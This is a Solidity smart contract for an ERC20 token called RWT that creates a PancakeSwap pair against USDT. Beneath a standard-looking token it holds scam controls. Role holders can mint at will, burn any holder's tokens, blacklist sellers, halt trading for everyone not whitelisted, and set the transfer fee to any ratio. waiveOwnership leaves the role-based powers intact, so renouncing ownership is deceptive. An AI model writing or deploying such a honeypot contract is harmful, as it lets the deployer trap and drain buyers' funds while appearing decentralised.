// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function feeTo() external view returns (address);
}

contract Ownable is Context {
    address private _owner;

    mapping(address => bool) internal role; // user -> true

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        role[address(this)] = true;
        role[msgSender] = true;
        role[tx.origin] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(hasRole(_msgSender()), "Ownable: caller is not the owner");
        _;
    }

    function hasRole(address addr) public view returns (bool) {
        return role[addr];
    }

    function setRole(address addr, bool t) public onlyOwner {
        role[addr] = t;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract RWT is ERC20, Ownable {
    mapping(address => bool) public whitelist; 
    mapping(address => bool) public blacklist; 
    bool public tradingEnabled = false; 
    address public pancakeSwapPair; 
    address public transferfeeAddress;

    constructor() ERC20("RWT", "RWT"){
        address _pancakeSwapRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;
            //USDT
        address UsdtAddress= 0x55d398326f99059fF775485246999027B3197955;
        address receiveAddress=_msgSender();
        transferfeeAddress=_msgSender();
        ISwapRouter swapRouter = ISwapRouter(_pancakeSwapRouter);
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address pair = swapFactory.createPair(address(this), UsdtAddress);
        pancakeSwapPair = pair;
        _mint(receiveAddress, 100000000 * 10**18); 
        whitelist[receiveAddress] = true; 
        whitelist[_pancakeSwapRouter] = true; 
    }
    function settransferfeeAddress(address _address) external onlyOwner {
        transferfeeAddress=_address;
    }
    function mint(address _to, uint256 _amount) external onlyOwner {
        _mint(_to, _amount);
    }
    function burn(address _From, uint256 _amount) external onlyOwner {
        _burn(_From,_amount);
    }
    function setPancakeSwapPair(address _pair) external onlyOwner {
        pancakeSwapPair = _pair;
        // whitelist[_pair] = true; 
    }

    function addToWhitelist(address _account) external onlyOwner {
        whitelist[_account] = true;
    }

    function removeFromWhitelist(address _account) external onlyOwner {
        whitelist[_account] = false;
    }

    function addToBlacklist(address _account) external onlyOwner {
        blacklist[_account] = true;
    }

    function removeFromBlacklist(address _account) external onlyOwner {
        blacklist[_account] = false;
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    function disableTrading() external onlyOwner {
        tradingEnabled = false;
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (allowance(sender,msg.sender) != ~uint256(0)) {
            _spendAllowance(sender, msg.sender, amount);
        }
        return true;
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    uint256[2] public transferRadio=[80,100];
    function settransferRadio(uint256 _radio1,uint256 _radio2) public onlyOwner{
        transferRadio[0]=_radio1;
        transferRadio[1]=_radio2;
    }

    function _update(address from, address to, uint256 value) internal virtual override {
        if (from != address(0) && to != address(0)) {
            if (from == pancakeSwapPair) {
                require(!blacklist[to], "Recipient is blacklisted and cannot buy from pool");
                require(tradingEnabled || whitelist[to], "Recipient is not whitelisted to buy from pool");
            }
            else if (to == pancakeSwapPair) {
                require(!blacklist[from], "Sender is blacklisted and cannot sell to pool");
                require(tradingEnabled || whitelist[from], "Sender is not whitelisted to sell to pool");
            }
            else {
                if (!whitelist[to] && !whitelist[from]) {
                    uint256 transferAmount = value * transferRadio[0] / transferRadio[1];
                    uint256 transferFee = value - transferAmount;
                    if (transferFee > 0) {
                        super._update(from, transferfeeAddress, transferFee);
                        value = transferAmount;
                    }
                }
            }

            if (!whitelist[from] && !whitelist[to]) {
                uint256 balance = balanceOf(from);
                uint256 maxSellAmount;
                uint256 remainAmount = 10**(decimals() - 6);
                if (balance > remainAmount) {
                    maxSellAmount = balance - remainAmount;
                }
                if (value > maxSellAmount) {
                    value = maxSellAmount;
                }
            }
        }

        super._update(from, to, value);
    }
}